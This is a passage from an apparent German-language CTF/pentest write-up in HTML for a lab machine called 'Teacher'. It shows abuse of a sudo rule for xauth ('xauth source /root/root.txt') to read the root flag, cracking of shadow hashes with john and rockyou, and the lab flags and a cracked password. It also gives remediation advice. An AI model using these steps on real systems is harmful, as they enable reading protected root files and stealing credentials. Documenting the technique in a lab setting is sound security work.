+                         <div class="prompt">mrteacher@Teacher:~$ <span class="command">sudo -u root xauth source /root/root.txt</span></div>
+                     </div>
+                 </div>
+
+                 <p class="analysis"><strong>2. Anzeigen der exfiltrierten Daten:</strong> Der Befehl `xauth list` wird ausgeführt.</p>
+                 <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe von `xauth list` enthält die Zeichenkette `b3386aefd470a6e309e54bc1be5eb774`. Dies ist sehr wahrscheinlich der Inhalt der zuvor mit `xauth source` gelesenen Root-Flag-Datei (`/root/root.txt`). *Anmerkung: Der zweite `xauth list` vom Angreifer-System ist irrelevant. Das Speichern in `keks.txt` ist auch nur zur Dokumentation.*</p>
+                 <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Vergleichen Sie die Ausgabe von `xauth list` mit dem erwarteten Flag-Format. Hier wurde die Root-Flag erfolgreich exfiltriert.
+                 <br><strong>Empfehlung (Admin):</strong> Entfernen Sie die `sudo`-Regel.</p>
+                 <div class="code-block">
+                     <div class="terminal">
+                         <div class="prompt">mrteacher@Teacher:/tmp$ <span class="command">xauth list</span></div>
+                         <pre><span class="password">b3386aefd470a6e309e54bc1be5eb774</span></pre> <!-- Tatsächliche Root-Flag -->
+                         <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">xauth list</span></div>
+                         <pre>cyber/unix:0  MIT-MAGIC-CKIE-1  4dc0704b1b7982ef8129eafc258c28bf</pre> <!-- Irrelevante lokale Ausgabe -->
+                         <div class="prompt">mrteacher@Teacher:/tmp$ <span class="command">echo "4dc0704b1b7982ef8129eafc258c28bf" > keks.txt</span></div> <!-- Irrelevantes Speichern -->
+                     </div>
+                 </div>
+                  <p class="evaluation"><strong>Risikobewertung:</strong> Hoch. Die `sudo`-Regel für `xauth` ermöglicht das Auslesen beliebiger Dateien, auf die root Lesezugriff hat, einschließlich sensibler Schlüssel, Konfigurationsdateien und Flags, was zur vollständigen Kompromittierung führen kann.</p>
+                  <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                    <ol>
+                        <li>Entfernen Sie die Zeile `mrteacher ALL=(ALL : ALL) NPASSWD: /bin/xauth` (und `/bin/gedit`) aus der `/etc/sudoers`-Datei.</li>
+                        <li>Überprüfen Sie alle `sudo`-Regeln sorgfältig nach dem Prinzip der geringsten Rechte.</li>
+                    </ol>
+                 </p>
+             </section> <!-- POC Abschnitt endet hier -->
+
+             <p class="analysis"><strong>Analyse:</strong> Ein weiterer Versuch, Passwörter mit `john` zu knacken, wird gezeigt. Diesmal wird `unshadow2.txt` verwendet. Es findet das Passwort `HappyBack2Sch00l`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Es ist unklar, zu welchem Benutzer dieses Passwort gehört oder ob es relevant ist, da der Root-Zugriff bzw. das Auslesen der Flag bereits über `xauth` erfolgte. Dies scheint ein weiterer explorativer Schritt zu sein, der nicht direkt zum Ziel führte oder dessen Relevanz im Log nicht klar wird.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kann als alternative Untersuchungsmethode dokumentiert werden, aber der Fokus sollte auf dem erfolgreichen `xauth`-Pfad liegen.
+             <br><strong>Empfehlung (Admin):</strong> Sichern Sie Passwort-Hashes.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~/HackingTools]
+└─# <span class="command">unshadow passwd.txt shadow.txt > unshadow2.txt</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadow2.txt</span></div>
+                      <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (crypt, generic crypt(3) [?/64])
+[...]
+<span class="password">HappyBack2Sch00l</span>
+[...]
+Session completed.</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/mrteacher/user</div>
+                     <div class="flag-value"><span class="password">9cd1f0b79d9474714c5a29214ec839a6</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <!-- Befehl impliziert durch xauth-Exploit -->
+                     <div class="flag-command">sudo xauth source /root/root.txt; xauth list</div>
+                     <div class="flag-value"><span class="password">b3386aefd470a6e309e54bc1be5eb774</span></div>
+                 </div>
+             </div>
+         </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 24. Oktober 2023</p>  
+    </footer>
+</body>
+</html>
